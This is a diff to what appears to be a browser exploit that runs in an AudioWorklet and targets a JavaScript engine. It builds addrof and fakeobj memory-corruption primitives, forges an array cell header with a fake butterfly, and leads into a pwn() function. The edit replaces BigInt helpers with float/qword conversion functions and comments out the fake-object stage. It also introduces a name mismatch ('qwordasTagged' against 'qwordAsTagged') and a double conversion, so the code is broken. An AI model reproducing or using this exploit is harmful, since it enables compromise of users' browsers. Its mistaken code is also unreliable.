@@ -9,8 +9,24 @@
         log("starting...")
         var context = new OfflineAudioContext(1, 128, 300000);
         context.audioWorklet.addModule(URL.createObjectURL(new Blob([`
+          let data_view = new DataView(new ArrayBuffer(8));
+var floatAsQword = float => {
+    data_view.setFloat64(0, float, true);
+    var low = data_view.getUint32(0, true);
+    var high = data_view.getUint32(4, true);
+    return low + (high * 0x100000000);
+}
+var qwordAsTagged = qword =>{
+    return qwordAsFloat( qword- 0x02000000000000);
+}
+var qwordAsFloat = qword => {
+    data_view.setUint32(0, qword%0x100000000, true);
+    data_view.setUint32(4, qword/0x100000000, true);
+    //data_view.setBigUint64(0, qword);
+    return data_view.getFloat64(0, true);
+}
           // constant added to double JSValues
-          const kBoxedDoubleOffset = 0x0002000000000000n;
+          const kBoxedDoubleOffset = 0x0002000000000000;
           function boxDouble(d) {
             return d + kBoxedDoubleOffset;
           }
@@ -18,7 +34,7 @@
             return d - kBoxedDoubleOffset;
           }
           // the structure ID is wrong, but we'll fix it :)
-          let doubleArrayCellHeader = 0x0108230700000000n;
+          let doubleArrayCellHeader = qwordasTagged(0x0108230700000000);
           let f = new Float64Array(1);
           let u = new Uint32Array(f.buffer);
           function float2bigint(v) {
@@ -70,7 +86,8 @@
             b1[0] = kSentinel;
             // scan for the sentinel to find the offset from a to b
             for (var i = 0; i < 0x100; i++) {
-              if (bigint2float(unboxDouble(float2bigint(a1[i]))) == kSentinel) {
+              if (qwordAsFloat(qwordasTagged(a1[i])) == kSentinel) {
+              //qwordAsFloat
                 offset = i;
                 break;
               }
@@ -91,14 +108,14 @@
             }
 
             let obj = {
-              jsCellHeader: bigint2float(unboxDouble(doubleArrayCellHeader)),
+              jsCellHeader: qwordasTagged(doubleArrayCellHeader),
               fakeButterfly: a0
             };
 
             let addr = addrof(obj);
             port.postMessage("obj @ " + addr.toString(16));
 
-            let fakeArr = fakeobj(addr + 0x10n);
+            /*let fakeArr = fakeobj(addr + 0x10n);
 
             // subtract off the incref
             doubleArrayCellHeader = float2bigint(fakeArr[0]) - 0x1n;
@@ -128,7 +145,7 @@
             addrof = (val) => {
               b1[0] = val;
               return float2bigint(a1[0]);
-            }
+            }*/
           }
 
           function pwn() {
